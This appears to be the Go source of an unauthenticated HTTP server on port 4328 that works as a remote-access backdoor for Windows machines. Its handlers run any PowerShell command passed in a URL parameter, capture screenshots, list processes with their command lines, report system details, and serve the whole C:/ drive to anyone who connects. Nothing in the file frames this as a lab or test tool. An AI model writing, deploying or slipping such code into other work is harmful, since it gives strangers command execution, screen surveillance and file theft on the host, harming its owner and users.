package main

import (
	"encoding/json"
	"fmt"
	"image/png"
	"net/http"
	"os/exec"
	"strconv"

	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/mem"
	"github.com/shirou/gopsutil/process"
	"github.com/vova616/screenshot"
)

func handlePowerShellCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	command := r.URL.Query().Get("command")
	if command == "" {
		http.Error(w, "Empty command", http.StatusBadRequest)
		return
	}

	output, err := runPowerShellCommand(command)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error executing PowerShell command: %s", err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(output))
}

func runPowerShellCommand(command string) (string, error) {
	cmd := exec.Command("powershell.exe", "-Command", command)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("failed to execute PowerShell command: %w", err)
	}

	return string(output), nil
}

func handleScreenshot(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	img, err := screenshot.CaptureScreen()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error capturing screenshot: %s", err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "image/png")
	err = png.Encode(w, img)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error encoding screenshot: %s", err), http.StatusInternalServerError)
		return
	}
}

func handleSystemInfo(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	cpuInfo, err := cpu.Info()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error getting CPU info: %s", err), http.StatusInternalServerError)
		return
	}

	memInfo, err := mem.VirtualMemory()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error getting memory info: %s", err), http.StatusInternalServerError)
		return
	}

	systemInfo := struct {
		CPU    []cpu.InfoStat         `json:"cpu"`
		Memory *mem.VirtualMemoryStat `json:"memory"`
	}{
		CPU:    cpuInfo,
		Memory: memInfo,
	}

	writeJSONResponse(w, systemInfo)
}

func handleProcesses(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	processList, err := process.Processes()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error getting process list: %s", err), http.StatusInternalServerError)
		return
	}

	var processRows []map[string]string

	for _, proc := range processList {
		pid := proc.Pid
		name, _ := proc.Name()
		status, _ := proc.Status()
		cmdline, _ := proc.Cmdline()

		processRow := map[string]string{
			"PID":     strconv.Itoa(int(pid)),
			"Name":    name,
			"Status":  status,
			"Cmdline": cmdline,
		}

		processRows = append(processRows, processRow)
	}

	writeJSONResponse(w, processRows)
}

func handleFileServe(w http.ResponseWriter, r *http.Request) {
	dir := "C:/"
	http.FileServer(http.Dir(dir)).ServeHTTP(w, r)
}

func writeJSONResponse(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	err := json.NewEncoder(w).Encode(data)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error encoding JSON response: %s", err), http.StatusInternalServerError)
	}
}

func main() {
	http.HandleFunc("/powershell", handlePowerShellCommand)
	http.HandleFunc("/screenshot", handleScreenshot)
	http.HandleFunc("/system", handleSystemInfo)
	http.HandleFunc("/procs", handleProcesses)
	http.HandleFunc("/", handleFileServe)

	port := 4328
	fmt.Printf("Server is running on :%d\n", port)
	err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
	if err != nil {
		fmt.Printf("Error starting server: %s\n", err)
	}
}
